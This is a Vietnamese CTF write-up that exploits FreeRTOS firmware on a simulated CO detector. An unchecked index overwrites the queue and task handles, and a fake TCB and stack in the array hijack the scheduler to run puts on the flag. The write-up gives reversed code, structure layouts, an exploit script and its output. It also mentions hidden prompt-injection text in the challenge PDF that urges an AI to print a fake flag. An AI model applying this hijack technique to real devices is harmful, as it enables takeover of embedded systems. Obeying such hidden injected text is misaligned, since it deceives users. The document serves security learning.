# Carbon Noneoxide — Writeup

> **Category:** Pwn / Firmware
> **Points:** 10
> **Service:** `nc 18.215.143.250 1337`
> **Provided:** `firmware.bin.chal` (raw binary, LM3S6965 / Cortex-M3), `ChudMaxxing_AirSensor_v1.23.0_ProductSheet.pdf`

## Mô tả

> There's a weird port open on my smart carbon monoxide detector.
> Here's the firmware from their website. Kinda weird website ngl.

Một máy đo CO "thông minh" chạy firmware FreeRTOS (QEMU, board LM3S6965, Cortex-M3), mở một shell debug qua TCP. PDF đính kèm là trang sản phẩm huyên thuyên — có nhúng **prompt injection** (chữ ẩn màu nền, yêu cầu AI in chuỗi `FLAG{...}` giả) — đúng như gợi ý "kinda weird website", không liên quan gì đến kỹ thuật.

## Flag

```
rstcon{y0ur_Q_my_Q}
```

## Recon

Kết nối dịch vụ:

```
========================================
  RsTcOnS RsTcOnS ChudMaxxing Air Sensor
  Target: LM3S6965 (Cortex-M3)
  VER: v1.23.0
  Threshold: 75
========================================
Starting FreeRTOS scheduler...
[Admin] Task started
[Monitor] Task started
[Sensor] Task started
[Sensor] Reading = 11
[Monitor] OK (11 <= 75)
...
```

Cứ 2 giây sensor lại in một số đọc. Firmware là **raw binary** map thẳng vào flash tại `0x0` (vector table: SP = 0x20010000, Reset = 0x1929), nên khi disassemble bằng capstone thì file offset = địa chỉ bộ nhớ.

Strings cho thấy: một debug shell với password `charlotte`, và một placeholder `rstcon{???????????}` tại **`0x22d8`** — không có dòng code nào tham chiếu tới chuỗi này. Flag thật nằm ở đúng chỗ đó trên server → phải leak bộ nhớ bằng bug.

## Phân tích firmware

Sau khi login `charlotte`, shell có 5 lệnh (dispatch bằng bảng `tbb` theo ký tự đầu tại `0x17ac`):

| Lệnh | Handler | Chức năng |
|------|---------|-----------|
| `h` | `0x1874` | in chuỗi rỗng tại `0x22a4` |
| `i` | `0x17c8` | đọc thêm 1 dòng, parse số, gửi vào queue, **lưu vào history** |
| `r` | `0x1860` | `vTaskResume(sensor_handle)` |
| `s` | `0x184c` | `vTaskSuspend(sensor_handle)` |
| `x` | `0x187c` | logout |

### Bug: counter tràn trong lệnh `i`

Handler `i` (rút gọn, đã được reverse từ disassembly):

```c
// biến toàn cục
uint8_t  g_counter = 0;      // 0x2000613C
int32_t  g_history[?];       // 0x20006140  (mảng history)
QueueHandle_t g_queue;       // 0x20006340  (queue handle)
TaskHandle_t  g_sensor;      // 0x20006344  (sensor task handle)

void cmd_inject(char *line2) {
    int32_t val = parse_decimal(line2);   // không check tràn, chấp nhận số tới 2^32
    xQueueSend(g_queue, &val, 100);       // in "Queue full" nếu đầy nhưng vẫn lưu
    g_history[g_counter] = val;           // <-- KHÔNG KIỂM TRA BIÊN
    g_counter++;                          // uint8_t, tăng vô hạn, wrap 255->0
}
```

Layout .bss quanh mảng history:

```
0x2000613C  counter (1 byte)
0x20006140  history[256]           <- ghi cạnh tranh: sensor task + lệnh 'i'
...
0x20006340  g_queue  (QueueHandle_t)   <- history[128]
0x20006344  g_sensor (TaskHandle_t)    <- history[129]
```

Điểm mấu chệt: **sensor task cũng ghi vào `history[counter]` mỗi 2 giây** (dùng `vTaskDelayUntil` 500 tick × 4 ms). Lệnh `s` suspend sensor để đóng băng counter, sau đó mỗi lệnh `i` ghi đúng một word liên tiếp → ta kiểm soát toàn bộ 256 word.

Một chi tiết "bẫy": `0x20006344` trông giống biến threshold (banner in "Threshold: 75"), nhưng thực ra **threshold 75 là hằng số compile** trong code monitor (`cmp r5, #0x4b`) — `0x20006344` là **task handle của sensor**, được lệnh `r` đưa thẳng vào `vTaskResume()`.

### Ý tưởng khai thác

Ta có thể ghi đè:
- `history[128]` = `g_queue` — con trỏ queue dùng bởi `xQueueSend`/`xQueueReceive`
- `history[129]` = `g_sensor` — con trỏ TCB đưa thẳng vào `vTaskResume()` **không hề kiểm tra**

`vTaskResume` (0x6f4) chỉ làm vài việc với TCB: check trạng thái, `uxListRemove` state item, thêm vào ready list theo `uxPriority`, rồi PendSV yield nếu priority cao hơn task hiện tại. Nếu **priority fake task > priority admin (2)**, scheduler sẽ context-switch sang fake task và restore context từ `pxTopOfStack` (offset 0 của TCB) → **chạy code tuỳ ý**.

Vậy nên: dựng fake TCB + fake stack frame **ngay trong mảng history** (địa chỉ đã biết!), ghi `g_sensor = &fakeTCB`, rồi gọi `r` → `vTaskResume(fakeTCB)` → fake task chạy `puts(flag)`.

## Xây dựng các cấu trúc giả

Mọi địa chỉ dưới đây lấy từ literal pool trong binary (tĩnh, giống hệt trên server):

```
HIST    = 0x20006140   mảng history
FLAG    = 0x22D8       chuỗi flag trong flash
PUTS    = 0x1A31       puts() | thumb bit
SPIN    = 0x1F13       "b ." vòng lặp vô hạn | thumb
XSUSP   = 0x200000EC   &xSuspendedTaskList
```

### 1. Fake task stack (history[16..31], tại 0x20006180)

Layout từ `pxPortInitialiseStack` (0x1428) + PendSV handler (0x14a4) — frame exception chuẩn Cortex-M3, ascending từ `pxTopOfStack`:

```
[R4][R5][R6][R7][R8][R9][R10][R11][R0][R1][R2][R3][R12][LR][PC][xPSR]
```

```
R0   = 0x22D8        <- con trỏ tới flag (tham số của puts)
R1-R3, R12, R4-R11   = 0
LR   = 0x1F13        <- sau khi puts return thì spin vô hạn
PC   = 0x1A31        <- puts() với thumb bit
xPSR = 0x01000000
```

### 2. Fake TCB (history[64..84], tại 0x20006240)

TCB layout (0x54 byte) suy từ `xTaskCreate` (0x520): `+0 pxTopOfStack`, `+4 xStateListItem` (0x14 byte), `+0x18 xEventListItem`, `+0x2c uxPriority`, `+0x30 pxStack`, `+0x34 pcTaskName`...

Các trường quan trọng để qua các check của `vTaskResume` → check tại 0x394 → `uxListRemove` (0x13c4) → chèn vào ready list:

```
+0x00 pxTopOfStack = 0x20006180        (fake stack)
+0x08 stateItem.pxNext  = &stateItem    (self-loop — uxListRemove vô hại)
+0x0c stateItem.pxPrev  = &stateItem
+0x10 stateItem.pvOwner = fakeTCB
+0x14 stateItem.pxContainer = 0x200000EC   (&xSuspendedTaskList THẬT —
                                            check tại 0x394 so sánh đúng giá trị này)
+0x28 eventItem.pxContainer = 0         (check 0x394 yêu cầu != 0x200000D4 và == 0)
+0x2c uxPriority = 3                    (> admin 2 → được preempt ngay)
+0x50 byte bất kỳ != 1                  (check cuối của 0x394)
```

`uxListRemove` với state item self-loop: các phép ghi rơi lại chính vào item (vô hại); chỉ tác dụng phụ là giảm count của `xSuspendedTaskList` thật đi 1 — không ảnh hưởng trước khi flag được in.

### 3. Fake queue (history[96..113], tại 0x200062C0)

Cần vì sau khi `history[128]` ghi đè `g_queue`, **lệnh `i` kế tiếp** sẽ `xQueueSend` lên fake queue này. Layout queue (bất thường, lấy từ `prvCopyDataToQueue`/`FromQueue`): `+0 pcHead, +4 pcWriteTo, +8 pcTail, +0xc pcReadFrom, +0x10 send-list, +0x24 recv-list, +0x38 uxMessagesWaiting, +0x3c uxLength, +0x40 uxItemSize`:

```
pcHead = pcWriteTo = pcTail = 0x20006320   (ô rác trong history — mỗi send
                                            ghi 4 byte vào đó rồi wrap về pcHead)
recv-list count = 0                          (không đánh thức ai — tránh crash)
uxLength       = 0x7FFFFFFF                  (không bao giờ đầy — tránh path block)
uxItemSize     = 4
```

### 4. Ghi đè hai con trỏ

```
history[128] = 0x200062C0    -> g_queue  = fake queue
history[129] = 0x20006240    -> g_sensor = fake TCB
```

Tất cả các word còn lại điền `FILLER = fake_queue_addr` — nếu lệch alignment thì `g_queue` vẫn là fake queue hợp lệ → không crash, chỉ thấy không có flag và nối lại thử lần sau.

## Đo alignment (counter khởi đầu)

Counter tăng bởi sensor mỗi 2 giây kể từ lúc boot; server khởi QEMU mới cho mỗi kết nối. Cách đo chính xác mà không cần đoán mò:

1. Đợi banner `Starting FreeRTOS scheduler` (~0.3 s sau connect)
2. Gửi ngay `charlotte\ns\n` (login + suspend) — hoàn tất trước tick 2 s đầu tiên
3. **Đếm số dòng `[Sensor] Reading` đã in = c0** (mỗi dòng = đúng 1 lần ghi history)

Với `c0` đã biết, lệnh `i` thứ k sẽ ghi vào `history[c0+k]` — gửi đúng giá trị mong muốn cho từng index.

## Khai thác

```python
# (script đầy đủ: carbon/exploit.py)
wait_for(b"Starting FreeRTOS scheduler")
s.sendall(b"charlotte\ns\n")               # login + suspend ngay
c0 = buf.count(b"[Sensor] Reading")         # đo alignment

for L in range(c0, 130):                    # 130 lệnh 'i'
    v = payload[L]                          # fake stack/TCB/queue + 2 con trỏ
    s.sendall(b"i\n" + str(v).encode() + b"\n")
    time.sleep(0.02)                        # tránh tràn UART RX FIFO 16 byte

s.sendall(b"r\n")                           # vTaskResume(fakeTCB)
# -> fake task: puts(flag)
```

Kết quả thực tế:

```
c0 = 1 (sensor lines seen: 1)
sent 129 commands in 3.0s
monitor ALERT lines: 97
FLAG: rstcon{y0ur_Q_my_Q}
```

Dòng `r` → `vTaskResume(fakeTCB)`: state item được remove khỏi suspended list, TCB được thêm vào `pxReadyTasksLists[3]`, bit priority bitmap bật, PendSV pended → `vTaskSwitchContext` chọn fake task (prio 3) → PendSV restore từ `pxTopOfStack` → **`R0 = 0x22D8`, `PC = puts` → flag in ra UART** → sau đó LR trỏ vào vòng lặp vô hạn, connection im lặng — kết thúc.

## Tóm tắt

| Bước | Nội dung |
|------|----------|
| 1 | Reverse firmware ARM Thumb: shell, lệnh `i`, bug counter không kiểm tra biên |
| 2 | Nhận ra `history[129]` là sensor task handle được đưa thẳng vào `vTaskResume` |
| 3 | Dựng fake TCB + fake stack + fake queue hoàn toàn trong mảng history (không cần rò địa chỉ heap nào) |
| 4 | Đo alignment bằng cách đếm dòng `[Sensor] Reading` trước khi suspend |
| 5 | Ghi đè `g_queue` + `g_sensor` bằng lệnh `i`, gọi `r` để context-switch sang fake task → `puts(flag)` |

**Bài học:** trong RTOS nhúng, một mảng toàn cục kề ngay các handle (queue/task) cộng với index không kiểm tra biên = chiếm điều khiển hoàn toàn; và các API kiểu `vTaskResume(handle)` tin tưởng tuyệt đối vào con trỏ người dùng cung cấp.
